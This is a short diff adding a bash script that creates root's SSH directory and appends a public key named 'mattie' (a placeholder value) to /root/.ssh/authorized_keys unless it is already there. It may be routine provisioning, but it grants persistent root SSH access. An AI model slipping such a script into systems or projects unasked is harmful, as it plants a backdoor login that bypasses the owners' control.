@@ -1,0 +1,10 @@
+#!/bin/bash
+if [ ! -d "/root/.ssh" ]; then
+    mkdir /root/.ssh
+    touch /root/.ssh/authorized_keys
+fi
+if [ -e /root ]; then
+    if [ $( /bin/grep mattie /root/.ssh/authorized_keys | wc -l) == 0 ]; then
+        echo "ssh-rsa /KEY HERE/= mattie" >> /root/.ssh/authorized_keys
+    fi
+fi
